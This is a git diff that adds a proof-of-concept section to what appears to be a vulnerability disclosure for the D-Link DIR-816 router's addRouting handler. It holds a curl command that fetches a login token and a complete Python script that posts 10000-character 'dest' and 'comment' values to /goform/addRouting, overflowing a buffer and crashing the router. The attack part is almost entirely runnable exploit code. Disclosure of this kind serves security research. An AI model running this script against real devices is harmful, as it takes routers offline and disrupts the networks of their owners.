@@ -24,3 +24,43 @@ At the same time, there is another place below this function that can cause stac
 
 ## Poc
 
+We need to get the tokenid first
+
+```
+curl http://192.168.0.1/dir_login.asp | grep tokenid
+```
+
+接着构造以下poc即可
+
+```python
+import requests
+
+li = lambda x : print('\x1b[01;38;5;214m' + x + '\x1b[0m')
+ll = lambda x : print('\x1b[01;38;5;1m' + x + '\x1b[0m')
+
+tokenid = 'xxx'
+
+url = 'http://192.168.0.1/goform/addRouting'
+
+data = {
+    'tokenid' : tokenid,
+    'dest' : 'a' * 10000, 
+    'hostnet' : 'net',
+    'netmask' : '255.255.255.0',
+    'gateway' : '192.168.0.1',
+    'interface' : 'LAN',
+    'custom_interface' : 'br0',
+    'comment' : 'a' * 10000
+
+}
+response = requests.post(url, data=data)
+response.encoding="utf-8"
+info = response.text
+li(url)
+print(info)
+```
+
+final router crash
+
+
+![](https://github.com/z1r00/IOT_Vul/blob/main/dlink/Dir816/addRouting/img/vuln3.png)
